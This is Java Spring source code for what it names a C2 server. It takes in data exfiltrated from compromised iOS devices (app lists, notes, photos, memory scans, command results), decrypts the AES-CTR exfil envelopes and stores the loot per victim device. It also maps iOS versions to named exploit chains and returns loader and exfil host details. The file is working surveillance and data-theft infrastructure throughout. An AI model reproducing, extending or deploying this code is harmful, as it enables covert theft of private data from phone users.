package com.ctwo.service.impl;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneOffset;
import java.time.format.DateTimeFormatter;
import java.util.LinkedHashMap;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.RestController;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.ctwo.entity.Ios18ParamEntity;
import com.ctwo.service.ApiService;
import com.ctwo.service.CaptureStorageService;
import com.ctwo.service.WarService;
import com.ctwo.util.ExfilCrypto;
import com.ctwo.util.HttpRequestUtils;
import com.ctwo.util.IpUtil;
import com.ctwo.util.RequestGuardUtil;

import lombok.extern.slf4j.Slf4j;

/**
 * 18-ctwo-server C2 接口实现。
 *
 * <p><b>ACK-first</b>：所有 POST 接口读 body → 派发异步 capture → 立即返回固定 ACK。
 * 业务异常只打日志，不影响 200 ACK 返回。
 *
 * <p><b>路径归一</b>：{@code /api/X} 与 {@code /X} 共用同一处理方法；
 * kind 用归一名（如 {@code u/nb/event/...}），path 字段保留实际请求 URI。
 *
 * <p><b>capture 派发</b>：通过外部 Bean {@link CtwoAsyncWriter#capture} 调用，
 * 让 {@code @Async("databaseOperateStreamPush")} 经 AOP 代理生效。
 */
@Slf4j
@RestController
public class ApiServiceImpl implements ApiService {

    /** UUID 提取键优先级（接口文档 §0.6）。 */
    private static final String[] UUID_KEYS = {"uuid", "lhu", "device_uuid", "deviceUUID"};

    /** memres Redis key 前缀（GET 轮询 / POST 缓存最新结果） */
    private static final String MEMRES_REDIS_KEY = "api18:memres:";

    private final IpUtil ipUtil;
    private final CtwoAsyncWriter asyncWriter;
    private final CaptureStorageService captureStorage;
    private final WarService warService;
    private final RedisTemplate<String, Object> redisTemplate;

    @Value("${lab.enc.password:}")
    private String encPassword;

    @Value("${lab.enc.salt:}")
    private String encSalt;

    @Autowired
    private CtwoAsyncWriter ctwoAsyncWriter;

    @Autowired
    private com.ctwo.dao.DeviceDao deviceDao;

    public ApiServiceImpl(IpUtil ipUtil, CtwoAsyncWriter asyncWriter,
                          CaptureStorageService captureStorage, WarService warService,
                          RedisTemplate<String, Object> redisTemplate) {
        this.ipUtil = ipUtil;
        this.asyncWriter = asyncWriter;
        this.captureStorage = captureStorage;
        this.warService = warService;
        this.redisTemplate = redisTemplate;
    }

    /** 解密上行 AES-CTR 信封（C2_API.md §5）；明文 body 原样返回。 */
    private String decryptBody(String body) {
        return ExfilCrypto.maybeDecryptExfilBody(body, encPassword, encSalt);
    }

    // ==================== POST 业务接口 ====================

    @Override
    public ResponseEntity<String> postU(HttpServletRequest request) {
        String clientIp = ipUtil.getClientIp(request);
        String body = null;
        try {
            body = decryptBody(HttpRequestUtils.readBody(request));
            if (!RequestGuardUtil.isJsonObjectBody(body)) {
                log.info("/u 丢弃非 JSON body ip={}", clientIp);
                return ackText("0");
            }
            JSONObject json = parseJsonObject(body);
            String uuid = firstNonEmpty(json, UUID_KEYS);
            if (uuid == null) uuid = "";
            if (!uuid.isEmpty()) {
                asyncWriter.handleU(body, uuid, clientIp);
            }
        } catch (Exception e) {
            log.error("/u 写入失败 ip={} err={}", clientIp, e.toString(), e);
        }
        dispatchCapture(request, body, "u", "应用列表", "04_应用列表", false);
        return ackText("0");
    }

    @Override
    public ResponseEntity<String> postWar(HttpServletRequest request) {
        return warService.handle(request, request.getRequestURI());
    }

    @Override
    public ResponseEntity<String> postNb(HttpServletRequest request) {
        String clientIp = ipUtil.getClientIp(request);
        try {
            String rawBody = HttpRequestUtils.readBody(request);
            String body = decryptBody(rawBody);
            if (!RequestGuardUtil.isJsonObjectBody(body)) {
                log.info("postNb 丢弃非 JSON body ip={}", clientIp);
                return ackText("0");
            }
            String headersJson = HttpRequestUtils.toHeadersJson(request);
            String path = request.getRequestURI();

            // 单次 JSON 解析：同时提取 uuid/tt/source，避免重复 parse
            JSONObject json = parseJsonObject(body);
            String uuid = firstNonEmpty(json, UUID_KEYS);
            if (uuid == null) uuid = "";
            String tt = json == null ? "" : firstNonEmpty(json, "tt");
            String source = json == null ? "" : firstNonEmpty(json, "source");

            // IP 兜底：body 里 uuid 为空时，通过 clientIp 查 device 表最近注册的设备
            if (uuid.isEmpty()) {
                uuid = lookupDeviceByIp(clientIp);
                if (uuid == null) uuid = "";
                if (!uuid.isEmpty()) {
                    log.info("postNb uuid 兜底 from IP ip={} device={}", clientIp, uuid);
                }
            }

            // body 字节长度只算一次（用解密后的明文 body）
            byte[] bodyBytes = body == null ? new byte[0] : body.getBytes(StandardCharsets.UTF_8);
            int bodyLen = bodyBytes.length;

            if (bodyLen == 0) {
                return ackText("0"); // 空 body 直接 ACK
            }

            // 构造 entity（不含文件落盘 —— 移到异步线程执行）
            Ios18ParamEntity entity = Ios18ParamEntity.newCapture(
                    "nb", "POST", clientIp, path, headersJson, uuid, tt, source);
            entity.setCategory("备忘录笔记");
            entity.setCategoryDir("05_备忘录笔记");
            entity.setBodyBytes(bodyLen);

            // 异步：落盘(如需) + 入库 + 入队（ACK-first，不阻塞响应）
            asyncWriter.captureAndEnqueueNb(entity, bodyBytes, body);
        } catch (Exception e) {
            log.error("postNb FAIL ip={} err={}", clientIp, e.toString(), e);
        }
        return ackText("0");
    }

    @Override
    public ResponseEntity<String> postResult(HttpServletRequest request) {
        dispatchCapture(request, null, "result", "命令结果", "09_命令结果", false);
        return ackJson("{\"ok\":true}");
    }

    @Override
    public ResponseEntity<String> postLog(HttpServletRequest request) {
        dispatchCapture(request, null, "log", "运行日志", "08_运行日志", true);
        return ackJson("{\"ok\":true}");
    }

    @Override
    public ResponseEntity<String> postP(HttpServletRequest request) {
        handlePhotoUpload(request);
        return ackText("ok");
    }

    // ==================== GET 探活 ====================

    @Override
    public ResponseEntity<String> getProbe(HttpServletRequest request) {
        // 探活不 capture，固定 -1
        return ResponseEntity.ok()
                .contentType(MediaType.TEXT_PLAIN)
                .body("-1");
    }

    // ==================== P1 控制面：GET /api/chain-targets ====================

    @Override
    public ResponseEntity<String> getChainTargets(HttpServletRequest request) {
        String ios = request.getParameter("ios");
        String chain = resolveChain(ios);
        Map<String, Object> resp = new LinkedHashMap<>();
        resp.put("chain", chain);
        resp.put("band", resolveBand(chain));
        resp.put("recommended_worker", "pe_worker_a*_18." + (ios != null ? ios : "x") + ".js");
        resp.put("entry_point", "/pe_stage/loader.js");
        // exfil 主机提示（本 lab 取证走 nui 路径，不以 exfil.stats_url 为准）
        String host = HttpRequestUtils.resolveDomain(request);
        Map<String, Object> exfil = new LinkedHashMap<>();
        exfil.put("host", host);
        exfil.put("stats_url", "http://" + host + "/stats");
        resp.put("exfil", exfil);
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(JSON.toJSONString(resp));
    }

    // ==================== P1.5 内存扫描：GET|POST /api/memres ====================

    @Override
    public ResponseEntity<String> getMemres(HttpServletRequest request) {
        // pe_worker 轮询 resident 结果：从 Redis 取最新 POST 缓存
        String uuid = firstParam(request, "uuid", "deviceUUID", "lhu", "device");
        if (uuid == null || uuid.isEmpty()) {
            return ackJson("{\"results\":[],\"phase\":\"idle\"}");
        }
        try {
            Object cached = redisTemplate.opsForValue().get(MEMRES_REDIS_KEY + uuid);
            if (cached != null) {
                return ackJson(cached.toString());
            }
        } catch (Exception e) {
            log.warn("memres GET redis fail uuid={} err={}", uuid, e.getMessage());
        }
        return ackJson("{\"results\":[],\"phase\":\"idle\"}");
    }

    @Override
    public ResponseEntity<String> postMemres(HttpServletRequest request) {
        String clientIp = ipUtil.getClientIp(request);
        try {
            String rawBody = HttpRequestUtils.readBody(request);
            String body = decryptBody(rawBody);
            JSONObject json = parseJsonObject(body);
            String uuid = firstNonEmpty(json, UUID_KEYS);
            if (uuid == null) uuid = "unknown";

            // 落盘：exfil_darksword/<uuid>/10_内存扫描/
            String phase = (json != null) ? json.getString("phase") : null;
            byte[] bodyBytes = body == null ? new byte[0] : body.getBytes(StandardCharsets.UTF_8);

            // 即使 phase=done 且 0 命中也落盘（C2_API.md §1.3）
            storeMemresToDisk(uuid, body, bodyBytes, phase);

            // 缓存到 Redis 供 GET 轮询
            try {
                redisTemplate.opsForValue().set(MEMRES_REDIS_KEY + uuid, body);
            } catch (Exception e) {
                log.warn("memres POST redis cache fail uuid={} err={}", uuid, e.getMessage());
            }

            log.info("memres POST ok uuid={} phase={} ip={} bytes={}",
                    uuid, phase, clientIp, bodyBytes.length);
        } catch (Exception e) {
            log.error("memres POST FAIL ip={} err={}", clientIp, e.toString(), e);
        }
        return ackJson("{\"ok\":true}");
    }

    // ==================== 内部：chain-targets 辅助 ====================

    /** 根据 iOS 版本号返回 chain 名（C2_API.md §1.1）。 */
    private static String resolveChain(String ios) {
        if (ios == null || ios.isEmpty()) {
            return "darksword"; // 默认
        }
        double v = parseIosMajorMinor(ios);
        if (v < 0) return "darksword";
        if (v >= 13.0 && v <= 17.21) return "coruna";
        if (v >= 17.3 && v <= 18.3) return "silkpath";
        if (v >= 18.4 && v <= 18.72) return "darksword";
        if (v >= 18.73) return "ghostwave";
        return "darksword";
    }

    /** 根据 chain 返回频段标签。 */
    private static String resolveBand(String chain) {
        switch (chain) {
            case "coruna":    return "low";
            case "silkpath":   return "mid";
            case "darksword":  return "high";
            case "ghostwave":  return "next";
            default:           return "high";
        }
    }

    /** 解析 iOS 版本号 "18.6.2" → 18.6（double）；异常返回 -1。 */
    private static double parseIosMajorMinor(String ios) {
        try {
            String[] parts = ios.split("\\.");
            if (parts.length < 2) return -1;
            return Double.parseDouble(parts[0] + "." + parts[1]);
        } catch (Exception e) {
            return -1;
        }
    }

    /** 从 request 中按多个候选参数名取首个非空值。 */
    private static String firstParam(HttpServletRequest request, String... keys) {
        for (String key : keys) {
            String v = request.getParameter(key);
            if (v != null && !v.isEmpty()) return v;
        }
        return null;
    }

    // ==================== 内部：memres 落盘 ====================

    /** 落盘到 {uploadDir}/exfil_darksword/{uuid}/10_内存扫描/{timestamp}_{phase}.json */
    private void storeMemresToDisk(String uuid, String body, byte[] bodyBytes, String phase) {
        if (bodyBytes == null || bodyBytes.length == 0) return;
        try {
            LocalDateTime now = LocalDateTime.ofInstant(Instant.now(), ZoneOffset.ofHours(8));
            String date = DateTimeFormatter.ofPattern("yyyyMMdd").format(now);
            String ts = DateTimeFormatter.ofPattern("HHmmss").format(now);
            String ph = (phase != null && !phase.isEmpty()) ? phase : "data";
            String dir = captureStorage.getUploadDir()
                    + "/exfil_darksword/" + uuid + "/10_内存扫描/" + date;
            Path dirPath = Paths.get(dir);
            Files.createDirectories(dirPath);
            Path filePath = dirPath.resolve(ts + "_" + ph + ".json");
            Files.write(filePath, bodyBytes);
            log.info("memres 落盘成功 uuid={} phase={} path={}", uuid, ph, filePath);
        } catch (Exception e) {
            log.error("memres 落盘失败 uuid={} err={}", uuid, e.toString(), e);
        }
    }

    // ==================== 工具 GET（§3.10） ====================

    @Override
    public ResponseEntity<String> getMyIp(HttpServletRequest request) {
        String ip = ipUtil.getClientIp(request);
        return ResponseEntity.ok()
                .contentType(MediaType.TEXT_PLAIN)
                .body(ip == null ? "" : ip);
    }

    @Override
    public ResponseEntity<String> getC2(HttpServletRequest request) {
        java.util.Map<String, Object> info = new java.util.LinkedHashMap<>();
        info.put("service", "18-ctwo-server");
        info.put("env", System.getProperty("spring.profiles.active", "default"));
        info.put("base_url", HttpRequestUtils.resolveDomain(request));
        info.put("paths", new String[]{"/u", "/nb", "/event", "/result", "/log", "/p"});
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(JSON.toJSONString(info));
    }

    @Override
    public ResponseEntity<String> getLogHtml(HttpServletRequest request) {
        // 空 HTML，无 capture / 无 Redis
        return ResponseEntity.ok()
                .contentType(MediaType.TEXT_HTML)
                .body("<!DOCTYPE html><html><head></head><body></body></html>");
    }

    @Override
    public ResponseEntity<String> getLogs(HttpServletRequest request) {
        String html = "<!DOCTYPE html><html><head><title>Logs</title></head>"
                + "<body><p>Logs are not available here.</p></body></html>";
        return ResponseEntity.ok()
                .contentType(MediaType.TEXT_HTML)
                .body(html);
    }

    @Override
    public ResponseEntity<String> getLogsTxt(HttpServletRequest request) {
        return ResponseEntity.ok()
                .contentType(MediaType.TEXT_PLAIN)
                .body("");
    }

    // ==================== 兜底（§4 capture_unimplemented） ====================

    @Override
    public ResponseEntity<String> captureUnimplemented(HttpServletRequest request) {
        log.debug("drop unimplemented path={} ip={}", request.getRequestURI(), ipUtil.getClientIp(request));
        return ResponseEntity.status(HttpStatus.NOT_FOUND)
                .contentType(MediaType.TEXT_PLAIN)
                .body("Not Found");
    }

    @Override
    public ResponseEntity<String> handleOptions(HttpServletRequest request) {
        return ResponseEntity.noContent().build();
    }

    // ==================== 内部：capture 派发 ====================

    /**
     * 通用 capture 派发：读 body → 组装 entity → <b>异步入库 + 异步阈值分流落盘</b>。
     *
     * <p>HTTP 线程仅做：读 body + 单次 JSON 解析（提取 uuid/tt/source）+ 构造 entity，
     * 然后把「阈值分流/dumpToFile/DB INSERT/Redis 推送」全部委托到
     * {@link CtwoAsyncWriter#captureAsyncDispatch}（databaseOperateStreamPush 线程池）。
     *
     * <p>高并发收益：/event、/result 等 100KB~1MB 的 body 不再在 Tomcat 线程里做
     * {@code Files.write} 磁盘 I/O，HTTP 线程池不被 I/O wait 占满，QPS 与尾延迟均显著改善。
     *
     * @param request       HTTP 请求
     * @param preBody       调用方已读取的 body（可 null，null 时内部 readBody）
     * @param kind          归一后的 kind
     * @param category      分类名
     * @param categoryDir   分类目录
     * @param skipStore     true 表示 skip_store（/log /p：不落库不推 Redis）
     */
    private void dispatchCapture(HttpServletRequest request, String preBody,
                                 String kind, String category, String categoryDir,
                                 boolean skipStore) {
        String clientIp = ipUtil.getClientIp(request);
        try {
            // 若调用方已预读 body（如 postU），直接用；否则内部读取
            // preBody 可能已经是解密后的，也可能是原始的；若原始则解密
            String body = (preBody != null) ? preBody : HttpRequestUtils.readBody(request);
            body = decryptBody(body);
            if (skipStore) {
                return;
            }
            byte[] bodyBytes = (body == null) ? new byte[0] : body.getBytes(StandardCharsets.UTF_8);
            int bodyLen = bodyBytes.length;

            boolean emptyBody = bodyLen == 0;
            if (emptyBody) {
                log.debug("dispatchCapture 丢弃空 body kind={} ip={}", kind, clientIp);
                return;
            }
            if (!RequestGuardUtil.isJsonObjectBody(body)) {
                log.debug("dispatchCapture 丢弃非 JSON body kind={} ip={} path={}", kind, clientIp, request.getRequestURI());
                return;
            }

            // 单次 JSON 解析：提取 uuid/tt/source（轻量 parse，HTTP 线程完成即可）
            JSONObject json = parseJsonObject(body);
            String uuid = firstNonEmpty(json, UUID_KEYS);
            if (uuid == null) uuid = "";
            String tt = firstNonEmpty(json, "tt");
            String source = firstNonEmpty(json, "source");

            // 组装 entity（不含 storage/file_path/body 分流 —— 交给异步线程做 I/O）
            String headersJson = HttpRequestUtils.toHeadersJson(request);
            Ios18ParamEntity entity = Ios18ParamEntity.newCapture(
                    kind, request.getMethod(), clientIp, request.getRequestURI(),
                    headersJson, uuid, tt, source);
            entity.setCategory(category);
            entity.setCategoryDir(categoryDir);
            entity.setBodyBytes(bodyLen);
            entity.setUnimplemented(0);

            // skipRedis：仅对小包（≤ body_inline_max 的 inline 存储）取消 Redis capture 推送
            // （与原版分流策略一致；异步线程内根据分流结果再决定是否推送）
            boolean skipRedisForInline = bodyLen <= captureStorage.getBodyInlineMax();

            asyncWriter.captureAsyncDispatch(entity, bodyBytes, body, kind, skipRedisForInline);
        } catch (Exception e) {
            log.info("iOS8param写入失败 kind={} ip={} path={} err={}",
                    kind, clientIp, request.getRequestURI(), e.toString(), e);
        }
    }

    /** 从 body JSON 按 key 列表顺序提取首个非空值（用于 uuid 多键兼容）。 */
    private static String firstNonEmpty(JSONObject json, String[] keys) {
        if (json == null) return null;
        for (String key : keys) {
            String v = json.getString(key);
            if (v != null && !v.isEmpty()) {
                return v;
            }
        }
        return null;
    }

    /** 从 body JSON 按 key 列表顺序提取首个非空值（用于 tt/source 单键）。 */
    private static String firstNonEmpty(JSONObject json, String key) {
        if (json == null) return "";
        String v = json.getString(key);
        return (v == null) ? "" : v;
    }

    /** 容错解析 JSON 对象；非对象 / 异常返回 null。 */
    private static JSONObject parseJsonObject(String body) {
        if (body == null || body.isEmpty()) {
            return null;
        }
        try {
            Object obj = JSON.parse(body);
            if (obj instanceof JSONObject) {
                return (JSONObject) obj;
            }
        } catch (Exception ignore) {
            // 非 JSON body（如纯文本 / 二进制），返回 null
        }
        return null;
    }

    // ==================== 内部：ACK 响应构造 ====================

    private static ResponseEntity<String> ackText(String body) {
        return ResponseEntity.ok()
                .contentType(MediaType.TEXT_PLAIN)
                .body(body);
    }

    private static ResponseEntity<String> ackJson(String body) {
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(body);
    }


    // ==================== 内部：/p 照片上传处理 ====================

    /**
     * /p 照片上传：读 body → 解密 → 构造 entity + 提取元数据 → 异步落盘/入库/入队。
     * ACK-first：HTTP 线程仅读 body + 解密 + 构造，委托到异步线程。
     */
    private void handlePhotoUpload(HttpServletRequest request) {
        String clientIp = ipUtil.getClientIp(request);
        try {
            byte[] rawBytes = HttpRequestUtils.readBodyBytes(request);
            if (rawBytes == null || rawBytes.length == 0) return;

            MultipartResult mp = parseMultipart(rawBytes);

            String uuid = mp.fields.get("uuid");
            if (uuid == null) uuid = "";
            // IP 兜底：body 里 uuid 为空时，通过 clientIp 查 device 表最近注册的设备
            if (uuid.isEmpty()) {
                uuid = lookupDeviceByIp(clientIp);
                if (uuid == null) uuid = "";
                if (!uuid.isEmpty()) {
                    log.info("postP uuid 兜底 from IP ip={} device={}", clientIp, uuid);
                }
            }

            String filename = mp.fields.get("filename");
            String tt = mp.fields.get("tt");
            String source = mp.fields.get("source");
            if (tt == null) tt = "";
            if (source == null) source = "";

            String headersJson = HttpRequestUtils.toHeadersJson(request);
            Ios18ParamEntity entity = Ios18ParamEntity.newCapture(
                    "p", request.getMethod(), clientIp, request.getRequestURI(),
                    headersJson, uuid, tt, source);
            entity.setCategory("照片上传");
            entity.setCategoryDir("07_照片上传");
            // bodyBytes 记录原始 multipart 大小
            entity.setBodyBytes(rawBytes.length);

            // 照片元数据
            Map<String, String> photoMeta = new java.util.HashMap<>();
            if (filename != null) photoMeta.put("filename", filename);
            String seq = mp.fields.get("seq");
            if (seq != null) photoMeta.put("seq", seq);
            String md5 = mp.fields.get("md5");
            if (md5 != null) photoMeta.put("md5", md5);

            // 异步：落盘图片文件 + 入库 ios18param + 发送 photo 队列消息
            // 传入图片二进制内容（mp.fileData），落盘只存图片不含 multipart 边界
            asyncWriter.captureAndEnqueuePhoto(entity, mp.fileData, null, photoMeta);
        } catch (Exception e) {
            log.error("postP FAIL ip={} err={}", clientIp, e.toString(), e);
        }
    }

    /** multipart 解析结果：文本字段 + 文件二进制内容。 */
    private static class MultipartResult {
        final Map<String, String> fields = new java.util.HashMap<>();
        byte[] fileData = new byte[0];
    }

    /**
     * 简易 multipart/form-data 解析：提取文本字段和文件二进制内容。
     * 不依赖 Spring multipart resolver（application.yml 里 enabled: false）。
     */
    private static MultipartResult parseMultipart(byte[] body) {
        MultipartResult result = new MultipartResult();
        if (body == null || body.length == 0) return result;

        // 从第一行提取 boundary（如 --------HqBound）
        int lineEnd = indexOf(body, 0, (byte) '\n');
        if (lineEnd < 0) return result;
        String boundaryLine = new String(body, 0, lineEnd, StandardCharsets.UTF_8).trim();
        if (boundaryLine.isEmpty() || !boundaryLine.startsWith("--")) return result;
        byte[] boundaryBytes = boundaryLine.getBytes(StandardCharsets.UTF_8);

        int pos = 0;
        while (pos < body.length) {
            // 找下一个 boundary
            int bStart = indexOf(body, pos, boundaryBytes);
            if (bStart < 0) break;
            int partStart = bStart + boundaryBytes.length;
            // 跳过 \r\n
            while (partStart < body.length && (body[partStart] == '\r' || body[partStart] == '\n')) partStart++;
            // 找下一个 boundary（part 结束位置）
            int bEnd = indexOf(body, partStart, boundaryBytes);
            if (bEnd < 0) break;
            // part 内容是 [partStart, bEnd)，去掉末尾 \r\n
            int partEnd = bEnd;
            if (partEnd >= 2 && body[partEnd - 2] == '\r' && body[partEnd - 1] == '\n') partEnd -= 2;
            else if (partEnd >= 1 && body[partEnd - 1] == '\n') partEnd -= 1;

            // 解析 part header：找 \r\n\r\n 分隔 header 和 content
            int headerEnd = indexOfDoubleCRLF(body, partStart, partEnd);
            if (headerEnd < 0) {
                pos = bEnd;
                continue;
            }
            String header = new String(body, partStart, headerEnd - partStart, StandardCharsets.UTF_8);
            int contentStart = headerEnd + 4; // skip \r\n\r\n
            int contentEnd = partEnd;

            // 从 Content-Disposition 提取 name 和 filename
            String name = extractMultipartHeader(header, "name=\"");
            String filename = extractMultipartHeader(header, "filename=\"");

            if (filename != null && !filename.isEmpty()) {
                // 文件 part：提取二进制内容
                result.fileData = new byte[contentEnd - contentStart];
                System.arraycopy(body, contentStart, result.fileData, 0, result.fileData.length);
            } else if (name != null && contentEnd > contentStart) {
                // 文本字段
                String value = new String(body, contentStart, contentEnd - contentStart, StandardCharsets.UTF_8).trim();
                result.fields.put(name, value);
            }
            pos = bEnd;
        }
        // 如果没提取到文件内容，用整个 body 兜底
        if (result.fileData.length == 0) {
            result.fileData = body;
        }
        return result;
    }

    /** 在 body 中从 from 开始查找 target 字节数组的起始位置。 */
    private static int indexOf(byte[] body, int from, byte[] target) {
        outer:
        for (int i = from; i <= body.length - target.length; i++) {
            for (int j = 0; j < target.length; j++) {
                if (body[i + j] != target[j]) continue outer;
            }
            return i;
        }
        return -1;
    }

    /** 在 body 中从 from 开始查找单个字节。 */
    private static int indexOf(byte[] body, int from, byte target) {
        for (int i = from; i < body.length; i++) {
            if (body[i] == target) return i;
        }
        return -1;
    }

    /** 在 body[from..end) 中查找 \r\n\r\n 的起始位置。 */
    private static int indexOfDoubleCRLF(byte[] body, int from, int end) {
        for (int i = from; i < end - 3; i++) {
            if (body[i] == '\r' && body[i + 1] == '\n' && body[i + 2] == '\r' && body[i + 3] == '\n') {
                return i;
            }
        }
        // 兼容 \n\n
        for (int i = from; i < end - 1; i++) {
            if (body[i] == '\n' && body[i + 1] == '\n') return i;
        }
        return -1;
    }

    /** 从 multipart header 中提取 name="xxx" 或 filename="xxx" 的值。 */
    private static String extractMultipartHeader(String header, String prefix) {
        int idx = header.indexOf(prefix);
        if (idx < 0) return null;
        int start = idx + prefix.length();
        int end = header.indexOf('"', start);
        if (end < 0) return null;
        return header.substring(start, end);
    }

    /** 通过 IP 查 device 表最近注册的设备 UUID（兜底：body 里 device 字段为空时）。 */
    private String lookupDeviceByIp(String clientIp) {
        if (clientIp == null || clientIp.isEmpty()) return null;
        try {
            com.ctwo.entity.DeviceEntity dev = deviceDao.findByIpLatest(clientIp);
            if (dev != null) {
                String devId = dev.getDeviceId();
                if (devId != null && !devId.isEmpty()) return devId;
            }
        } catch (Exception e) {
            log.warn("lookupDeviceByIp FAIL ip={} err={}", clientIp, e.toString());
        }
        return null;
    }
    

    @Override
    public ResponseEntity<String> testPush() {
        // 注意：file_path 必须是本机真实存在的 .bin；不存在时 consumer 会直接跳过
        Ios18ParamEntity entity = new Ios18ParamEntity();
        entity.setId(2004);
        entity.setFilePath("D:/c2_records/20260827/war/6C876F13035E23707F20BBDC2B60BBCF_cbc6a13f3ad681bd_23622099.bin");
        entity.setDeviceId("6C876F13035E23707F20BBDC2B60BBCF");
        entity.setKind("war");
        ctwoAsyncWriter.enqueueWarJobs(entity);
        log.info("testPush 已入队 war_unpack id={} file={}", entity.getId(), entity.getFilePath());
        return ResponseEntity.ok("{\"ok\":true,\"job\":\"war_unpack\",\"id\":" + entity.getId() + "}");
    }

    @Override
    public ResponseEntity<String> testNbPush() {
        // 仅把文件放到磁盘不会入库；必须入队 job=nb_memorandum，且 storage=file + 绝对路径
        Ios18ParamEntity entity = new Ios18ParamEntity();
        entity.setId(950);
        entity.setDeviceId("00B77548B9A26AC2B7063C8C2AA1715C");
        entity.setKind("nb");
        entity.setStorage("file");
        // 与用户放在 18-ios-pom 根目录的测试文件对齐
        entity.setFilePath("D:/c2_records/20260823/nb/00B77548B9A26AC2B7063C8C2AA1715C_b396e89a90342145_1222948.bin");
        ctwoAsyncWriter.enqueueNbMemorandum(entity, null);
        log.info("testNbPush 已入队 nb_memorandum id={} file={}", entity.getId(), entity.getFilePath());
        return ResponseEntity.ok("{\"ok\":true,\"job\":\"nb_memorandum\",\"id\":" + entity.getId()
                + ",\"file\":\"" + entity.getFilePath() + "\"}");
    }
}
